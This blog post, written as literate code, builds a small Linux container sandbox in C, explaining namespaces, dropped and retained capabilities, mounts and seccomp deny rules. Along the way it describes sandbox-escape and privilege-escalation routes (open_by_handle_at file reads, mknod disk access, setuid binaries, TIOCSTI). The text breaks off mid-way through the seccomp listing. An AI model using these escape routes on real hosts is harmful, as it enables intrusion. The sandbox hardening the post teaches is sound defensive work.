=== Content from blog.lizzie.io_de214299_20250124_234005.html ===

[rss](/rss.xml) [home](./) [github](https://github.com/startling) email
# Linux containers in 500 lines of code

## Table of Contents

* [Container setup](#orgba868eb)
* [`contained.c`](#org39f5223)
  + [Namespaces](#org0aee542)
  + [Capabilties](#orga723de6)
    - [Dropped capabilities](#org07e738c)
    - [Retained Capabilities](#orgc6d2b81)
  + [Mounts](#org00cc412)
  + [System Calls](#org8504d16)
    - [Disallowed System Calls](#org141a19c)
    - [Allowed System Calls](#org8ee812f)
  + [Resources](#org36fcb0f)
  + [Networking](#org65bbba4)

I've used Linux containers [directly](https://circleci.com) and [indirectly](https://chromium.googlesource.com/chromium/src/%2B/master/docs/linux_sandboxing.md) for years, but I
wanted to become more familiar with them. So I wrote some code. This
used to be 500 lines of code, I swear, but I've revised it some since
publishing; I've ended up with about 70 lines more.

I wanted specifically to find a minimal set of restrictions to run
untrusted code. This isn't how you should approach containers on
anything with any exposure: you should restrict everything you
can. But I think it's important to know which permissions are
categorically unsafe! I've tried to back up things I'm saying with
links to code or people I trust, but I'd love to know if I missed
anything.

This is a [`noweb`](https://www.cs.tufts.edu/~nr/noweb/)-style piece of literate code. References named
`<<x>>` will be expanded to the code block named `x`. You can find the
tangled source [here](linux-containers-in-500-loc/contained.c). This document is an [orgmode](http://orgmode.org/) document, you can
find its source [here](https://blog.lizzie.io/linux-containers-in-500-loc.org). This document and this code are licensed under
the GPLv3; you can find its source [here](https://www.gnu.org/licenses/gpl-3.0.en.html).

## Container setup

There are several complementary and overlapping mechanisms that make
up modern Linux containers. Roughly,

* `namespaces` are used to group kernel objects into different sets
  that can be accessed by specific process trees. For example, pid
  namespaces limit the view of the process list to the processes
  within the namespace. There are a couple of different kind of
  namespaces. I'll go into this more later.
* `capabilities` are used here to set some coarse limits on what uid 0
  can do.
* `cgroups` is a mechanism to limit usage of resources like memory,
  disk io, and cpu-time.
* `setrlimit` is another mechanism for limiting resource usage. It's
  older than cgroups, but can do some things cgroups can't.

These are all Linux kernel mechanisms. Seccomp, capabilities, and
`setrlimit` are all done with system calls. `cgroups` is accessed
through a filesystem.

There's a lot here, and the scope of each mechanism is pretty
unclear. They overlap a lot and it's tricky to find the best way to
limit things. User namespaces are somewhat new, and promise to unify a
lot of this behavior. But unfortunately compiling the kernel with user
namespaces enabled complicates things. Compiling with user namespaces changes the
semantics of capabilities system-wide, which could cause more problems
or at least confusion[1](#fn.1). There have been a
large number of privilege-escalation bugs exposed by user
namespaces. ["Understanding and Hardening Linux Containers"](https://www.nccgroup.trust/globalassets/our-research/us/whitepapers/2016/april/ncc_group_understanding_hardening_linux_containers-1-1.pdf) explains

> Despite the large upsides the user namespace provides in terms of
> security, due to the sensitive nature of the user namespace,
> somewhat conflicting security models and large amount of new code,
> several serious vulnerabilities have been discovered and new
> vulnerabilities have unfortunately continued to be discovered.
> These deal with both the implementation of user namespaces itself or
> allow the illegitimate or unintended use of the user namespace to
> perform a privilege escalation. Often these issues present
> themselves on systems where containers are not being used, and where
> the kernel version is recent enough to support user namespaces.

It's turned off by default in Linux at the time of this
writing[2](#fn.2), but many distributions apply patches
to turn it on in a limited way[3](#fn.3).

But all of these issues apply to hosts with user namespaces compiled
in; it doesn't really matter whether we use user namespaces or not,
especially since I'll be preventing nested user namespaces. So I'll
only use a user namespace if they're available.

(The user-namespace handling in this code was originally pretty
broken. Jann Horn in particular gave great feedback. Thanks!)

## `contained.c`

This program can be used like this, to run `/misc/img/bin/sh` in
`/misc/img` as `root`:

```

[lizzie@empress l-c-i-500-l]$ sudo ./contained -m ~/misc/busybox-img/ -u 0 -c /bin/sh
=> validating Linux version...4.7.10.201610222037-1-grsec on x86_64.
=> setting cgroups...memory...cpu...pids...blkio...done.
=> setting rlimit...done.
=> remounting everything with MS_PRIVATE...remounted.
=> making a temp directory and a bind mount there...done.
=> pivoting root...done.
=> unmounting /oldroot.oQ5jOY...done.
=> trying a user namespace...writing /proc/32627/uid_map...writing /proc/32627/gid_map...done.
=> switching to uid 0 / gid 0...done.
=> dropping capabilities...bounding...inheritable...done.
=> filtering syscalls...done.
/ # whoami
root
/ # hostname
05fe5c-three-of-pentacles
/ # exit
=> cleaning cgroups...done.

```

So, a skeleton for it:

Listing 7: `contained.c`
```
/* -*- compile-command: "gcc -Wall -Werror -lcap -lseccomp contained.c -o contained" -*- */
/* This code is licensed under the GPLv3. You can find its text here:
   https://www.gnu.org/licenses/gpl-3.0.en.html */

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <grp.h>
#include <pwd.h>
#include <sched.h>
#include <seccomp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/capability.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <linux/capability.h>
#include <linux/limits.h>

struct child_config {
	int argc;
	uid_t uid;
	int fd;
	char *hostname;
	char **argv;
	char *mount_dir;
};

<<capabilities>>

<<mounts>>

<<syscalls>>

<<resources>>

<<child>>

<<choose-hostname>>

int main (int argc, char **argv)
{
	struct child_config config = {0};
	int err = 0;
	int option = 0;
	int sockets[2] = {0};
	pid_t child_pid = 0;
	int last_optind = 0;
	while ((option = getopt(argc, argv, "c:m:u:"))) {
		switch (option) {
		case 'c':
			config.argc = argc - last_optind - 1;
			config.argv = &argv[argc - config.argc];
			goto finish_options;
		case 'm':
			config.mount_dir = optarg;
			break;
		case 'u':
			if (sscanf(optarg, "%d", &config.uid) != 1) {
				fprintf(stderr, "badly-formatted uid: %s\n", optarg);
				goto usage;
			}
			break;
		default:
			goto usage;
		}
		last_optind = optind;
	}
finish_options:
	if (!config.argc) goto usage;
	if (!config.mount_dir) goto usage;

<<check-linux-version>>

	char hostname[256] = {0};
	if (choose_hostname(hostname, sizeof(hostname)))
		goto error;
	config.hostname = hostname;

<<namespaces>>

	goto cleanup;
usage:
	fprintf(stderr, "Usage: %s -u -1 -m . -c /bin/sh ~\n", argv[0]);
error:
	err = 1;
cleanup:
	if (sockets[0]) close(sockets[0]);
	if (sockets[1]) close(sockets[1]);
	return err;
}

```

Since I'll be blacklisting system calls and capabilities, it's
important to make sure there aren't any new ones.

Listing 8: `<<check-linux-version>>` =
```
	fprintf(stderr, "=> validating Linux version...");
	struct utsname host = {0};
	if (uname(&host)) {
		fprintf(stderr, "failed: %m\n");
		goto cleanup;
	}
	int major = -1;
	int minor = -1;
	if (sscanf(host.release, "%u.%u.", &major, &minor) != 2) {
		fprintf(stderr, "weird release format: %s\n", host.release);
		goto cleanup;
	}
	if (major != 4 || (minor != 7 && minor != 8)) {
		fprintf(stderr, "expected 4.7.x or 4.8.x: %s\n", host.release);
		goto cleanup;
	}
	if (strcmp("x86_64", host.machine)) {
		fprintf(stderr, "expected x86_64: %s\n", host.machine);
		goto cleanup;
	}
	fprintf(stderr, "%s on %s.\n", host.release, host.machine);

```

(This had a bug. [captainjey on reddit let me know. Thanks!](https://www.reddit.com/r/programming/comments/57x26h/linux_containers_in_500_lines_of_code/d8w07vf?context%3D3))

And I wasn't quite at 500 lines of code, so I thought I had some
space to build nice hostnames.

Listing 9: `<<choose-hostname>>` =
```
int choose_hostname(char *buff, size_t len)
{
	static const char *suits[] = { "swords", "wands", "pentacles", "cups" };
	static const char *minor[] = {
		"ace", "two", "three", "four", "five", "six", "seven", "eight",
		"nine", "ten", "page", "knight", "queen", "king"
	};
	static const char *major[] = {
		"fool", "magician", "high-priestess", "empress", "emperor",
		"hierophant", "lovers", "chariot", "strength", "hermit",
		"wheel", "justice", "hanged-man", "death", "temperance",
		"devil", "tower", "star", "moon", "sun", "judgment", "world"
	};
	struct timespec now = {0};
	clock_gettime(CLOCK_MONOTONIC, &now);
	size_t ix = now.tv_nsec % 78;
	if (ix < sizeof(major) / sizeof(*major)) {
		snprintf(buff, len, "%05lx-%s", now.tv_sec, major[ix]);
	} else {
		ix -= sizeof(major) / sizeof(*major);
		snprintf(buff, len,
			 "%05lxc-%s-of-%s",
			 now.tv_sec,
			 minor[ix % (sizeof(minor) / sizeof(*minor))],
			 suits[ix / (sizeof(minor) / sizeof(*minor))]);
	}
	return 0;
}

```

### Namespaces

`clone` is the system call behind `fork()` et al. It's also the key to
all of this. Conceptually we want to create a process with different
properties than its parent: it should be able to mount a different
`/`, set its own hostname, and do other things. We'll specify all of
this by passing flags to `clone` [4](#fn.4).

The child needs to send some messages to the parent, so we'll
initialize a socketpair, and then make sure the child only receives
access to one.

Listing 10: `<<namespaces>>` +=
```
	if (socketpair(AF_LOCAL, SOCK_SEQPACKET, 0, sockets)) {
		fprintf(stderr, "socketpair failed: %m\n");
		goto error;
	}
	if (fcntl(sockets[0], F_SETFD, FD_CLOEXEC)) {
		fprintf(stderr, "fcntl failed: %m\n");
		goto error;
	}
	config.fd = sockets[1];

```

But first we need to set up room for a stack. We'll `execve` later,
which will actually set up the stack again, so this is only
temporary.[5](#fn.5)

Listing 13: `<<namespaces>>` +=
```
	#define STACK_SIZE (1024 * 1024)

	char *stack = 0;
	if (!(stack = malloc(STACK_SIZE))) {
		fprintf(stderr, "=> malloc failed, out of memory?\n");
		goto error;
	}

```

We'll also prepare the cgroup for this process tree. More on this later.

Listing 14: `<<namespaces>>` +=
```
	if (resources(&config)) {
		err = 1;
		goto clear_resources;
	}

```

We'll namespace the mounts, pids, IPC data structures, network
devices, and hostname / domain name. I'll go into these more in the
code for capabilities, cgroups, and syscalls.

Listing 15: `<<namespaces>>` +=
```
	int flags = CLONE_NEWNS
		| CLONE_NEWCGROUP
		| CLONE_NEWPID
		| CLONE_NEWIPC
		| CLONE_NEWNET
		| CLONE_NEWUTS;

```

Stacks on x86, and almost everything else Linux runs on, grow
downwards, so we'll add `STACK_SIZE` to get a pointer just below the
end.[6](#fn.6) We also `|` the flags with `SIGCHLD` so
that we can `wait` on it.

Listing 16: `<<namespaces>>` +=
```
	if ((child_pid = clone(child, stack + STACK_SIZE, flags | SIGCHLD, &config)) == -1) {
		fprintf(stderr, "=> clone failed! %m\n");
		err = 1;
		goto clear_resources;
	}

```

Close and zero the child's socket, so that if something breaks then we
don't leave an open fd, possibly causing the child to or the parent to
hang.

Listing 17: `<<namespaces>>` +=
```
	close(sockets[1]);
	sockets[1] = 0;

```

The parent process will configure the child's user namespace and then
pause until the child process tree exits[7](#fn.7).

Listing 21: `<<child>>` +=
```
#define USERNS_OFFSET 10000
#define USERNS_COUNT 2000

int handle_child_uid_map (pid_t child_pid, int fd)
{
	int uid_map = 0;
	int has_userns = -1;
	if (read(fd, &has_userns, sizeof(has_userns)) != sizeof(has_userns)) {
		fprintf(stderr, "couldn't read from child!\n");
		return -1;
	}
	if (has_userns) {
		char path[PATH_MAX] = {0};
		for (char **file = (char *[]) { "uid_map", "gid_map", 0 }; *file; file++) {
			if (snprintf(path, sizeof(path), "/proc/%d/%s", child_pid, *file)
			    > sizeof(path)) {
				fprintf(stderr, "snprintf too big? %m\n");
				return -1;
			}
			fprintf(stderr, "writing %s...", path);
			if ((uid_map = open(path, O_WRONLY)) == -1) {
				fprintf(stderr, "open failed: %m\n");
				return -1;
			}
			if (dprintf(uid_map, "0 %d %d\n", USERNS_OFFSET, USERNS_COUNT) == -1) {
				fprintf(stderr, "dprintf failed: %m\n");
				close(uid_map);
				return -1;
			}
			close(uid_map);
		}
	}
	if (write(fd, & (int) { 0 }, sizeof(int)) != sizeof(int)) {
		fprintf(stderr, "couldn't write: %m\n");
		return -1;
	}
	return 0;
}

```

The child process will send a message to the parent process about
whether it should set uid and gid mappings. If that works, it will
`setgroups`, `setresgid`, and `setresuid`. Both `setgroups` and
`setresgid` are necessary here since there are two separate group
mechanisms on Linux[9](#fn.9). I'm also assuming here
that every uid has a corresponding gid, which is common but not
necessarily universal.

Listing 23: `<<child>>` +=
```
int userns(struct child_config *config)
{
	fprintf(stderr, "=> trying a user namespace...");
	int has_userns = !unshare(CLONE_NEWUSER);
	if (write(config->fd, &has_userns, sizeof(has_userns)) != sizeof(has_userns)) {
		fprintf(stderr, "couldn't write: %m\n");
		return -1;
	}
	int result = 0;
	if (read(config->fd, &result, sizeof(result)) != sizeof(result)) {
		fprintf(stderr, "couldn't read: %m\n");
		return -1;
	}
	if (result) return -1;
	if (has_userns) {
		fprintf(stderr, "done.\n");
	} else {
		fprintf(stderr, "unsupported? continuing.\n");
	}
	fprintf(stderr, "=> switching to uid %d / gid %d...", config->uid, config->uid);
	if (setgroups(1, & (gid_t) { config->uid }) ||
	    setresgid(config->uid, config->uid, config->uid) ||
	    setresuid(config->uid, config->uid, config->uid)) {
		fprintf(stderr, "%m\n");
		return -1;
	}
	fprintf(stderr, "done.\n");
	return 0;
}

```

And this is where the child process from `clone` will end up. We'll
perform all of our setup, switch users and groups, and then load the
executable. The order is important here: we can't change mounts
without certain capabilities, we can't `unshare` after we limit the
syscalls, etc.

Listing 24: `<<child>>` +=
```
int child(void *arg)
{
	struct child_config *config = arg;
	if (sethostname(config->hostname, strlen(config->hostname))
	    || mounts(config)
	    || userns(config)
	    || capabilities()
	    || syscalls()) {
		close(config->fd);
		return -1;
	}
	if (close(config->fd)) {
		fprintf(stderr, "close failed: %m\n");
		return -1;
	}
	if (execve(config->argv[0], config->argv, NULL)) {
		fprintf(stderr, "execve failed! %m.\n");
		return -1;
	}
	return 0;
}

```

### Capabilties

`capabilities` subdivide the property of "being root" on Linux. It's
useful to compartmentalize privileges so that, for example a process
can allocate network devices (`CAP_NET_ADMIN`) but not read all files
(`CAP_DAC_OVERRIDE`). I'll use them here to drop the ones we don't
want.

But not all of "being root" is subvidivided into capabilities. For
example, writing to parts of procfs is allowed by root even after
having dropped capabilities[10](#fn.10). There are a lot of
things like this: this is part of why need other restrictions beside
capabilities.

It's also important to think about how we're dropping capabilities. `man 7
capabilities` has an algorithm for us:

```
	During  an   execve(2),  the   kernel  calculates   the  new
	capabilities of the process using the following algorithm:

	    P'(ambient) = (file is privileged) ? 0 : P(ambient)

	    P'(permitted) = (P(inheritable) & F(inheritable)) |
					(F(permitted) & cap_bset) | P'(ambient)

	    P'(effective) = F(effective) ? P'(permitted) : P'(ambient)

	    P'(inheritable) = P(inheritable)    [i.e., unchanged]

	where:

	    P         denotes the  value of a thread  capability set
			    before the execve(2)

	    P'        denotes the  value of a thread  capability set
			    after the execve(2)

	    F         denotes a file capability set

	    cap_bset  is the  value of  the capability  bounding set
			    (described below).

```

We'd like `P'(ambient)` and `P(inheritable)` to be empty, and
`P'(permitted)` and `P(effective)` to only include the capabilities
above. This is achievable by doing the following

* Clearing our own inheritable set. This clears the ambient set; `man
  7 capabilities` says "The ambient capability set obeys the invariant
  that no capability can ever be ambient if it is not both permitted
  and inheritable." This also clears the child's inheritable set.
* Clearing the bounding set. This limits the file capabilities we'll
  gain when we `execve`, and the rest are limited by clearing the
  inheritable and ambient sets.

If we were to only drop our own effective, permitted and inheritable
sets, we'd regain the permissions in the child file's capabilities.
This is how `bash` can call `ping`, for example.[11](#fn.11)

#### Dropped capabilities

Listing 29: `<<capabilities>>` +=
```
int capabilities()
{
	fprintf(stderr, "=> dropping capabilities...");

```

`CAP_AUDIT_CONTROL`, `_READ`, and `_WRITE` allow access to the audit
system of the kernel (i.e. functions like `audit_set_enabled`, usually
used with `auditctl`). The kernel prevents messages that normally
require `CAP_AUDIT_CONTROL` outside of the first pid namespace, but it
does allow messages that would require `CAP_AUDIT_READ` and
`CAP_AUDIT_WRITE` from any namespace.[12](#fn.12) So
let's drop them all. We especially want to drop `CAP_AUDIT_READ`,
since it isn't namespaced[13](#fn.13) and may contain important
information, but `CAP_AUDIT_WRITE` may also allow the contained
process to falsify logs or DOS the audit system.

Listing 32: `<<capabilities>>` +=
```
	int drop_caps[] = {
		CAP_AUDIT_CONTROL,
		CAP_AUDIT_READ,
		CAP_AUDIT_WRITE,

```

`CAP_BLOCK_SUSPEND` lets programs prevent the system from suspending,
either with `EPOLLWAKEUP` or
/proc/sys/wake\_lock.[14](#fn.14) Supend isn't namespaced, so
we'd like to prevent this.

Listing 34: `<<capabilities>>` +=
```
		CAP_BLOCK_SUSPEND,

```

`CAP_DAC_READ_SEARCH` lets programs call `open_by_handle_at` with an
arbitrary `struct file_handle *`. `struct file_handle` is in theory an
opaque type, but in practice it corresponds to inode numbers. So it's
easy to brute-force them, and read arbitrary files. This was used by
Sebastian Krahmer to write a program to read arbitrary system files
from within Docker in 2014.[15](#fn.15)

Listing 36: `<<capabilities>>` +=
```
		CAP_DAC_READ_SEARCH,

```

`CAP_FSETID`, without user namespacing, allows the process to modify a
setuid executable without removing the setuid bit. This is pretty
dangerous! It means that if we include a setuid binary in a container,
it's easy for us to accidentally leave a dangerous setuid root binary
on our disk, which any user can use to escalate
privileges.[16](#fn.16)

Listing 40: `<<capabilities>>` +=
```
		CAP_FSETID,

```

`CAP_IPC_LOCK` can be used to lock more of a process' own memory than
would normally be allowed[17](#fn.17), which could be a way to deny service.

Listing 43: `<<capabilities>>` +=
```
		CAP_IPC_LOCK,

```

`CAP_MAC_ADMIN` and `CAP_MAC_OVERRIDE` are used by the mandatory acess
control systems Apparmor, SELinux, and SMACK to restrict access to
their settings. These aren't namespaced, so they could be used by the
contained programs to circumvent system-wide access control.

Listing 44: `<<capabilities>>` +=
```
		CAP_MAC_ADMIN,
		CAP_MAC_OVERRIDE,

```

`CAP_MKNOD`, without user namespacing, allows programs to create
device files corresponding to real-world devices. This includes
creating new device files for existing hardware. If this capability
were not dropped, a contained process could re-create the hard disk
device, remount it, and read or write to it.[18](#fn.18)

Listing 47: `<<capabilities>>` +=
```
		CAP_MKNOD,

```

I was worried that `CAP_SETFCAP` could be used to add a capability to
an executable and `execve` it, but it's not actually possible for a
process to set capabilities it doesn't have[19](#fn.19). But!
An executable altered this way could be executed by any unsandboxed
user, so I think it unacceptably undermines the security of the
system.

Listing 51: `<<capabilities>>` +=
```
		CAP_SETFCAP,

```

`CAP_SYSLOG` lets users perform destructive actions against the
syslog. Importantly, it doesn't prevent contained processes from
reading the syslog, which could be risky. It also exposes kernel
addresses, which could be used to circumvent kernel address layout
randomization[20](#fn.20).

Listing 54: `<<capabilities>>` +=
```
		CAP_SYSLOG,

```

`CAP_SYS_ADMIN` allows many behaviors! We don't want most of them
(`mount`, `vm86`, etc). Some would be nice to have (`sethostname`,
`mount` for bind mounts…) but the extra complexity doesn't seem
worth it.

Listing 55: `<<capabilities>>` +=
```
		CAP_SYS_ADMIN,

```

`CAP_SYS_BOOT` allows programs to restart the system (the `reboot`
syscall) and load new kernels (the `kexec_load` and `kexec_file`
syscalls)[21](#fn.21). We absolutely don't want
this. `reboot` is user-namespaced, and the `kexec*` functions only work
in the root user namespace, but neither of those help us.

Listing 59: `<<capabilities>>` +=
```
		CAP_SYS_BOOT,

```

`CAP_SYS_MODULE` is used by the syscalls `delete_module`,
`init_module`, `finit_module` [22](#fn.22), by the code for `kmod` [23](#fn.23),
and by the code for loading device modules with ioctl[24](#fn.24).

Listing 66: `<<capabilities>>` +=
```
		CAP_SYS_MODULE,

```

`CAP_SYS_NICE` allows processes to set higher priority on given pids
than the default[25](#fn.25). The default kernel scheduler
doesn't know anything about pid namespaces, so it's possible for a
contained process to deny service to the rest of the system[26](#fn.26).

Listing 71: `<<capabilities>>` +=
```
		CAP_SYS_NICE,

```

`CAP_SYS_RAWIO` allows full access to the host systems memory with
`/proc/kcore`, `/dev/mem`, and `/dev/kmem` [27](#fn.27), but a
contained process would need `mknod` to access these within the
namespace.[28](#fn.28). But it also allows things like `iopl`
and `ioperm`, which give raw access to the IO ports[29](#fn.29).

Listing 76: `<<capabilities>>` +=
```
		CAP_SYS_RAWIO,

```

`CAP_SYS_RESOURCE` specifically allows circumventing kernel-wide
limits, so we probably should drop it[30](#fn.30). But I
don't think this can do more than DOS the
kernel, in general[31](#fn.31).

Listing 78: `<<capabilities>>` +=
```
		CAP_SYS_RESOURCE,

```

`CAP_SYS_TIME`: setting the time isn't namespaced, so we should prevent
contained processes from altering the system-wide
time[32](#fn.32).

Listing 79: `<<capabilities>>` +=
```
		CAP_SYS_TIME,

```

`CAP_WAKE_ALARM`, like `CAP_BLOCK_SUSPEND`, lets the contained process
interfere with suspend[33](#fn.33), and we'd like to prevent that.

Listing 81: `<<capabilities>>` +=
```
		CAP_WAKE_ALARM
	};

```

Listing 82: `<<capabilities>>` +=
```
	size_t num_caps = sizeof(drop_caps) / sizeof(*drop_caps);
	fprintf(stderr, "bounding...");
	for (size_t i = 0; i < num_caps; i++) {
		if (prctl(PR_CAPBSET_DROP, drop_caps[i], 0, 0, 0)) {
			fprintf(stderr, "prctl failed: %m\n");
			return 1;
		}
	}
	fprintf(stderr, "inheritable...");
	cap_t caps = NULL;
	if (!(caps = cap_get_proc())
	    || cap_set_flag(caps, CAP_INHERITABLE, num_caps, drop_caps, CAP_CLEAR)
	    || cap_set_proc(caps)) {
		fprintf(stderr, "failed: %m\n");
		if (caps) cap_free(caps);
		return 1;
	}
	cap_free(caps);
	fprintf(stderr, "done.\n");
	return 0;
}

```

#### Retained Capabilities

It's important to keep track of the capabilities I'm not dropping,
too.

I've heard multiple places[34](#fn.34) that `CAP_DAC_OVERRIDE`
might expose the same functionality as `CAP_DAC_READ_SEARCH`
(i.e. `open_by_handle_at`), but as far as I can tell that isn't
true. `shocker.c` doesn't get anywhere with only
`CAP_DAC_OVERRIDE` [35](#fn.35), and the
only usage in the kernel is in the Unix permission-checking
code[36](#fn.36). So my understanding is that
`CAP_DAC_OVERRIDE` on its own doesn't allow processes to read outside
of their mount namespaces ("DAC" or "Discretionary Access Control"
refers here to ordinary unix permissions).

`CAP_FOWNER`, `CAP_LEASE`, and `CAP_LINUX_IMMUTABLE` all operate on
files inside of the mount namespace.

Likewise, `CAP_SYS_PACCT` allows processes to switch accounting on and
off for itself. The `acct` system call takes a path to log to (which
must be within the mount namespace), and only operates on the calling
process. We're not using process accounting in our containerization,
so turning it off should be harmless as well.[37](#fn.37)

`CAP_IPC_OWNER` is only used by functions that respect IPC
namespaces[38](#fn.38); since we're in a separate IPC namespace
from the host, we can allow this.

`CAP_NET_ADMIN` lets processes create network devices;
`CAP_NET_BIND_SERVICE` lets processes bind to low ports on those
devices; `CAP_NET_RAW` lets processes send raw packets on those
devices. Since we're going to isolate the networking with a virtual
bridge, and the contained process is inside of a network namespace,
these shouldn't be an issue[39](#fn.39). I was wondering
whether we could recreate an existing device like `mknod` does, but I
don't think it's possible [40](#fn.40).

`CAP_SYS_PTRACE` doesn't allow ptrace across pid
namespaces[41](#fn.41). `CAP_KILL` doesn't allow signals across
pid namespaces[42](#fn.42).

`CAP_SETUID` and `CAPSETGID` have similar behaviors[43](#fn.43):

* `Make arbitrary manipulations of process UIDS and GIDs and
  supplementary GID list`, which will only apply to pids in the
  namespace.
* `forge UID (GID) when passing socket credentials via UNIX domain
  sockets` the mount namespace should prevent us from reading the host
  system's unix domain sockets.
* `write a user(group ID) mapping in a user namespace (see
  user_namespaces(7))`: this is `/proc/self/uid_map`, which will be
  hidden inside the container.

`CAP_SETPCAP` only lets processes add or drop capabilities they
already effectively have; [`man 7 capabilities`](http://man7.org/linux/man-pages/man7/capabilities.7.html) says

> If file capabilities are supported: add any capability
> from the calling thread's bounding set to its
> inheritable set; drop capabilities from the bounding
> set (via prctl(2) PR\_CAPBSET\_DROP); make changes to the
> securebits flags.

We've dropped everything relevant from the bounding set, and dropping
further capabilities should be harmless.

`CAP_SYS_CHROOT` is traditionally abused by changing root to a
directory with a setuid root binary and tampered-with dynamic
libraries[44](#fn.44). Additionally, it can be used
to escape a chroot "jail"[45](#fn.45). Neither of those
should be relevant in our setup so this should be harmless.

[Brad Spengler, in "False Boundaries and Arbitrary Code Execution"](https://forums.grsecurity.net/viewtopic.php?f%3D7&t%3D2522) says
that `CAP_SYS_TTYCONFIG` can "temporarily change the keyboard
mapping of an administrator's tty via the KDSETKEYCODE ioctl to cause
a different command to be executed than intended", but again this is
an `ioctl` against a device that should be impossible to access within
the mount namespace.

### Mounts

The child process is in its own mount namespace, so we can unmount
things that it specifically shouldn't have access to. Here's how:

* Create a temporary directory, and one inside of it.
* Bind mount of the user argument onto the temporary directory
* `pivot_root`, making the bind mount our root and mounting the old
  root onto the inner temporary directory.
* `umount` the old root, and remove the inner temporary directory.

But first we'll remount everything with `MS_PRIVATE`. This is mostly a
convenience, so that the bind mount is invisible outside of our
namespace.

Listing 108: `<<mounts>>` =
```
<<pivot-root>>

int mounts(struct child_config *config)
{
	fprintf(stderr, "=> remounting everything with MS_PRIVATE...");
	if (mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL)) {
		fprintf(stderr, "failed! %m\n");
		return -1;
	}
	fprintf(stderr, "remounted.\n");

	fprintf(stderr, "=> making a temp directory and a bind mount there...");
	char mount_dir[] = "/tmp/tmp.XXXXXX";
	if (!mkdtemp(mount_dir)) {
		fprintf(stderr, "failed making a directory!\n");
		return -1;
	}

	if (mount(config->mount_dir, mount_dir, NULL, MS_BIND | MS_PRIVATE, NULL)) {
		fprintf(stderr, "bind mount failed!\n");
		return -1;
	}

	char inner_mount_dir[] = "/tmp/tmp.XXXXXX/oldroot.XXXXXX";
	memcpy(inner_mount_dir, mount_dir, sizeof(mount_dir) - 1);
	if (!mkdtemp(inner_mount_dir)) {
		fprintf(stderr, "failed making the inner directory!\n");
		return -1;
	}
	fprintf(stderr, "done.\n");

	fprintf(stderr, "=> pivoting root...");
	if (pivot_root(mount_dir, inner_mount_dir)) {
		fprintf(stderr, "failed!\n");
		return -1;
	}
	fprintf(stderr, "done.\n");

	char *old_root_dir = basename(inner_mount_dir);
	char old_root[sizeof(inner_mount_dir) + 1] = { "/" };
	strcpy(&old_root[1], old_root_dir);

	fprintf(stderr, "=> unmounting %s...", old_root);
	if (chdir("/")) {
		fprintf(stderr, "chdir failed! %m\n");
		return -1;
	}
	if (umount2(old_root, MNT_DETACH)) {
		fprintf(stderr, "umount failed! %m\n");
		return -1;
	}
	if (rmdir(old_root)) {
		fprintf(stderr, "rmdir failed! %m\n");
		return -1;
	}
	fprintf(stderr, "done.\n");
	return 0;
}

```

`pivot_root` is a system call lets us swap the mount at `/` with
another. Glibc doesn't provide a wrapper for it, but includes a
prototype in the man page. I don't really understand, but OK, we'll
include our own.

Listing 109: `<<pivot-root>>` =
```
int pivot_root(const char *new_root, const char *put_old)
{
	return syscall(SYS_pivot_root, new_root, put_old);
}

```

It's worth noting that I'm avoiding packing and unpackaging
containers. This is fertile ground for
vulnerabilities[46](#fn.46); I'll count on the user to
ensure that the mounted directory doesn't contain trusted or sensitive
files or hard links.

### System Calls

I'll be blacklisting system calls that I can demonstrate causing harm
or sandbox escapes. Again this isn't the best way to do this, but it
seems like the most illustrative.

[Docker's documentation](https://github.com/docker/docker.github.io/blob/master/engine/security/seccomp.md) and [default seccomp profile](https://github.com/docker/docker/blob/b248de7e332b6e67b08a8981f68060e6ae629ccf/profiles/seccomp/default.json) are reasonable
sources for dangerous system calls[47](#fn.47). They
also include obsolete sytem calls and calls that overlap with
restricted capabilities; I'll ignore those.

#### Disallowed System Calls

Listing 113: `<<syscalls>>` +=
```
#define SCMP_FAIL SCMP_ACT_ERRNO(EPERM)

int syscalls()
{
	scmp_filter_ctx ctx = NULL;
	fprintf(stderr, "=> filtering syscalls...");
	if (!(ctx = seccomp_init(SCMP_ACT_ALLOW))

```

We want to prevent new setuid / setgid executables from being created,
since in the absence of user namespaces the contained process could
create a setuid binary that could be used by any user to get
root.[48](#fn.48)

Listing 116: `<<syscalls>>` +=
```
	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(chmod), 1,
				SCMP_A1(SCMP_CMP_MASKED_EQ, S_ISUID, S_ISUID))
	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(chmod), 1,
				SCMP_A1(SCMP_CMP_MASKED_EQ, S_ISGID, S_ISGID))
	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(fchmod), 1,
				SCMP_A1(SCMP_CMP_MASKED_EQ, S_ISUID, S_ISUID))
	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(fchmod), 1,
				SCMP_A1(SCMP_CMP_MASKED_EQ, S_ISGID, S_ISGID))
	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(fchmodat), 1,
				SCMP_A2(SCMP_CMP_MASKED_EQ, S_ISUID, S_ISUID))
	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(fchmodat), 1,
				SCMP_A2(SCMP_CMP_MASKED_EQ, S_ISGID, S_ISGID))

```

Allowing contained processes to start new user namespaces can allow
processes to gain new (albeit limited) capabilities, so we prevent
it.

Listing 117: `<<syscalls>>` +=
```
	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(unshare), 1,
				SCMP_A0(SCMP_CMP_MASKED_EQ, CLONE_NEWUSER, CLONE_NEWUSER))
	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(clone), 1,
				SCMP_A0(SCMP_CMP_MASKED_EQ, CLONE_NEWUSER, CLONE_NEWUSER))

```

`TIOCSTI` allows contained processes to write to the controlling
terminal[49](#fn.49).

Listing 121: `<<syscalls>>` +=
```
	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(ioctl), 1,
				SCMP_A1(SCMP_CMP_MASKED_EQ, TIOCSTI, TIOCSTI))

```

The kernel keyring system isn't namespaced.[50](#fn.50)

Listing 123: `<<syscalls>>` +=
```
	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(keyctl), 0)
